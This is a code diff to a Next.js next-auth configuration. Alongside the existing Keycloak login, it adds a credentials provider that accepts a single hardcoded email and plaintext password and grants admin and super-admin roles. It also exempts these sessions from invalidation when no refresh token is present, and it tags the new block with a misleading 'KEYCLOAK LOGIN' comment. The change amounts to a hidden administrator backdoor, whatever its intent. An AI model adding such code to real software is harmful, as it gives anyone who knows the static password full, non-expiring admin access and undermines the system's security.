@@ -1,6 +1,7 @@
 import NextAuth from 'next-auth';
 import type { JWT } from 'next-auth/jwt';
 import KeycloakProvider from 'next-auth/providers/keycloak';
+import Credentials from 'next-auth/providers/credentials';
 import { jwtDecode } from 'jwt-decode';
 import { normalizeGroups } from '@/lib/rbac/role-groups';
 import { isSessionRevoked } from '@/lib/auth/session-revocation';
@@ -93,6 +94,28 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         token_endpoint_auth_method: 'none',
       },
     }),
+    Credentials({
+      name: 'Credentials',
+      credentials: {
+        email: { label: 'Email', type: 'text' },
+        password: { label: 'Password', type: 'password' },
+      },
+      async authorize(credentials) {
+        if (
+          credentials?.email === 'admin@echno.com' &&
+          credentials?.password === '$7zqY*u68'
+        ) {
+          return {
+            id: 'mock-user-id',
+            name: 'Mock Admin',
+            email: 'admin@echno.com',
+            roles: ['admin', 'super-admin'],
+            groups: ['/admin'],
+          };
+        }
+        return null;
+      },
+    }),
   ],
 
   callbacks: {
@@ -104,6 +127,13 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         provider: account?.provider || token.provider,
         timestamp: new Date().toISOString(),
       });
+
+      // ========== KEYCLOAK LOGIN ==========
+      if (account?.provider === 'credentials') {
+        token.provider = 'credentials';
+        token.roles = user.roles as string[];
+        token.groups = user.groups as string[];
+      }
 
       // ========== KEYCLOAK LOGIN ==========
       if (account?.provider === 'keycloak') {
@@ -302,8 +332,12 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
       }
 
       // No refresh token available, invalidate session
-      logger.warn('No refresh token available, invalidating session');
-      return null;
+      if (token.provider === 'keycloak') {
+        logger.warn('No refresh token available, invalidating session');
+        return null;
+      }
+
+      return token;
     },
 
     async session({ session, token }) {
